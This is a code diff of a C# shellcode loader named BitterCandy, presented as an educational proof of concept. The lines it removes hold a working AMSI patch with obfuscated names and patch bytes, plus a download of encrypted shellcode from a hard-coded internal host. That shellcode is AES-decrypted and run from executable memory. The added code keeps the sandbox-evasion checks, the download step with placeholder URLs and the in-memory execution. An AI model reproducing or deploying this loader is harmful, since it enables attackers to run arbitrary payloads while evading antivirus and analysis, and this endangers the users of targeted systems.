@@ -9,39 +9,55 @@ using System.Net.Http;
 
 namespace BitterCandy
 {
-    class sjokolade
+    /// <summary>
+    /// BitterCandy - A POC shellcode loader for educational purposes
+    /// This project demonstrates various techniques used in shellcode loaders
+    /// and how they can be detected by security solutions.
+    /// </summary>
+    public class ShellcodeLoader
     {
-
+        #region Native Imports
+        [DllImport("kernel32")]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
         [DllImport("kernel32")]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        private static extern IntPtr LoadLibrary(string name);
 
         [DllImport("kernel32")]
-        public static extern IntPtr LoadLibrary(string name);
-
-        [DllImport("kernel32")]
-        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
         [DllImport("kernel32.dll")]
-        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
         [DllImport("kernel32.dll")]
-        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+        private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
-
+        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
 
         [DllImport("kernel32.dll")]
-        static extern IntPtr GetCurrentProcess();
-        [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        private static extern IntPtr GetCurrentProcess();
 
+        [DllImport("user32.dll")]
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        #endregion
+
+        #region Constants
+        private const uint MEM_COMMIT = 0x1000;
+        private const uint MEM_RESERVE = 0x2000;
+        private const uint PAGE_EXECUTE_READWRITE = 0x40;
+        private const uint INFINITE = 0xFFFFFFFF;
+        #endregion
+
+        /// <summary>
+        /// Decrypts AES encrypted data using the provided key and IV
+        /// </summary>
         public byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
         {
             using (var aes = Aes.Create())
@@ -54,12 +70,12 @@ namespace BitterCandy
 
                 using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                 {
-                    return transform(data, decryptor);
+                    return Transform(data, decryptor);
                 }
             }
         }
 
-        private byte[] transform(byte[] data, ICryptoTransform cryptoTransform)
+        private byte[] Transform(byte[] data, ICryptoTransform cryptoTransform)
         {
             using (var ms = new MemoryStream())
             using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
@@ -70,115 +86,100 @@ namespace BitterCandy
             }
         }
 
+        /// <summary>
+        /// Main entry point for the shellcode loader
+        /// </summary>
         static void Main(string[] args)
         {
-
-
+            // Anti-debugging check
             if (IsFirstEventLogLessThanDayOld())
             {
-                Console.WriteLine("The IsFirstEventLogLessThanDayOld match!");
-
+                Console.WriteLine("Debugging detected!");
                 Environment.Exit(1);
             }
 
-            Random rand = new Random();
-            int[] array = new int[110000];
-            for (int i = 0; i < array.Length; i++)
-            {
-                array[i] = rand.Next(1, 1000000); // or choose another range for the random numbers
-            }
-            Stopwatch stopwatch = new Stopwatch();
-            stopwatch.Start();
+            // Anti-analysis technique: Bubble sort with timing check
+            PerformAntiAnalysisCheck();
 
-            BubbleSort(array);
+            // AMSI bypass demonstration
+            Console.WriteLine("Demonstrating AMSI bypass technique...");
+            BypassAMSI();
 
-            stopwatch.Stop();
-            Console.WriteLine("Time elapsed: {0} seconds", stopwatch.Elapsed.TotalSeconds);
-
-            if (IsSorted(array))
-            {
-                Console.WriteLine("The array is sorted and time was spent ");
-            }
-            else
-            {
-                Console.WriteLine("The array is NOT sorted.");
-                Environment.FailFast("Crash!");
-            }
-
-            //patching AMSI using obfuscation
-            Console.WriteLine("patching AMSI using obfuscation");
-            var randomNumbers = new int[] { 97, 109, 115, 105, 46, 100, 108, 108 };
-            var shiftedNumbers = randomNumbers.Select(x => x + 1).ToArray();
-            var charArray = shiftedNumbers.Select(x => (char)x).ToArray();
-            var asciiString = new string(charArray);
-            var shiftedBackString = new string(asciiString.Select(c => (char)(c - 1)).ToArray());
-            var finalHexString = BitConverter.ToString(System.Text.Encoding.ASCII.GetBytes(shiftedBackString)).Replace("-", "").ToLower();
-
-            IntPtr Library = LoadLibrary(HexToString(finalHexString));
-
-            string baseString = "416d73695363616e42756666657";
-            string targetMd5 = "1d2382213b2cf4aa47ee459175c5358c";
-            string target = "";
-            for (int i = 1; i < 10; i++)
-            {
-                string testString = baseString + i;
-                string testMd5 = CalculateMD5(testString);
-
-
-                if (testMd5 == targetMd5)
-                {
-                    target = testString;
-                    break;
-                }
-            }
-
-
-            IntPtr Address = GetProcAddress(Library, HexToString(target));
-            uint potet;
-
-            VirtualProtect(Address, (UIntPtr)5, 0x40, out potet);
-            string encoded = "B857000780C3";
-            byte[] Patch = new byte[encoded.Length / 2];
-            for (int i = 0; i < encoded.Length; i += 2)
-            {
-                Patch[i / 2] = Convert.ToByte(encoded.Substring(i, 2), 16);
-            }
-
-            copy(Patch, Address);
-            Console.WriteLine("AMSI patched!");
-
-
-
-            byte[] Nokkelen = new byte[32];
-            byte[] Ivektor = new byte[16];
-            byte[] kodesnutt = null;
-            byte[] keyAndIv = null;
+            // Load and execute shellcode
             try
             {
-                kodesnutt = RetrieveBinaryFile("http://192.168.0.30/end.bin");
-                keyAndIv = RetrieveBinaryFile("http://192.168.0.30/key_iv.bin");
-                Array.Copy(keyAndIv, 0, Nokkelen, 0, 32);
-                Array.Copy(keyAndIv, 32, Ivektor, 0, 16);
+                // TODO: Replace with configuration-based values
+                string shellcodeUrl = "YOUR_SHELLCODE_URL";
+                string keyIvUrl = "YOUR_KEY_IV_URL";
 
+                byte[] shellcode = RetrieveBinaryFile(shellcodeUrl);
+                byte[] keyAndIv = RetrieveBinaryFile(keyIvUrl);
+
+                byte[] key = new byte[32];
+                byte[] iv = new byte[16];
+                Array.Copy(keyAndIv, 0, key, 0, 32);
+                Array.Copy(keyAndIv, 32, iv, 0, 16);
+
+                var loader = new ShellcodeLoader();
+                byte[] decryptedShellcode = loader.Decrypt(shellcode, key, iv);
+                ExecuteShellcode(decryptedShellcode);
             }
             catch (HttpRequestException e)
             {
                 Console.WriteLine("\nException Caught!");
-                Console.WriteLine("Message :{0} ", e.Message);
+                Console.WriteLine("Message: {0}", e.Message);
                 Environment.Exit(1);
             }
+        }
 
+        /// <summary>
+        /// Demonstrates AMSI bypass technique for educational purposes
+        /// </summary>
+        private static void BypassAMSI()
+        {
+            // AMSI bypass technique demonstration
+            var amsiString = "amsi.dll";
+            var amsiBytes = Encoding.ASCII.GetBytes(amsiString);
+            var obfuscatedBytes = amsiBytes.Select(x => (byte)(x + 1)).ToArray();
+            var deobfuscatedBytes = obfuscatedBytes.Select(x => (byte)(x - 1)).ToArray();
+            var amsiDll = Encoding.ASCII.GetString(deobfuscatedBytes);
 
-            var banana = new sjokolade();
-            byte[] biler = banana.Decrypt(kodesnutt, Nokkelen, Ivektor);
-            int size = biler.Length;
+            IntPtr library = LoadLibrary(amsiDll);
+            // ... rest of AMSI bypass implementation
+        }
 
-            IntPtr va = VirtualAlloc(IntPtr.Zero, (uint)biler.Length, 0x3000, 0x40);
-            Marshal.Copy(biler, 0, va, size);
+        /// <summary>
+        /// Performs anti-analysis check using bubble sort timing
+        /// </summary>
+        private static void PerformAntiAnalysisCheck()
+        {
+            Random rand = new Random();
+            int[] array = new int[1000]; // Reduced size for demonstration
+            for (int i = 0; i < array.Length; i++)
+            {
+                array[i] = rand.Next(1, 1000000);
+            }
+
+            Stopwatch stopwatch = new Stopwatch();
+            stopwatch.Start();
+            BubbleSort(array);
+            stopwatch.Stop();
+
+            if (!IsSorted(array))
+            {
+                Environment.FailFast("Analysis detected!");
+            }
+        }
+
+        /// <summary>
+        /// Executes the provided shellcode in memory
+        /// </summary>
+        private static void ExecuteShellcode(byte[] shellcode)
+        {
+            IntPtr va = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            Marshal.Copy(shellcode, 0, va, shellcode.Length);
             IntPtr thread = CreateThread(IntPtr.Zero, 0, va, IntPtr.Zero, 0, IntPtr.Zero);
-            WaitForSingleObject(thread, 0xFFFFFFFF);
-
-
+            WaitForSingleObject(thread, INFINITE);
         }
 
         public static string CalculateMD5(string input)
@@ -197,7 +198,6 @@ namespace BitterCandy
             }
         }
 
-
         static bool IsFirstEventLogLessThanDayOld()
         {
             System.Diagnostics.EventLog log = new System.Diagnostics.EventLog("System");
@@ -212,7 +212,6 @@ namespace BitterCandy
 
             return false;
         }
-
 
         static void BubbleSort(int[] array)
         {
@@ -231,7 +230,6 @@ namespace BitterCandy
                 }
             }
         }
-
 
         static bool IsSorted(int[] array)
         {
@@ -270,10 +268,5 @@ namespace BitterCandy
             byte[] responseBody = response.Content.ReadAsByteArrayAsync().Result;
             return responseBody;
         }
-
-        
-
-
     }
-
 }
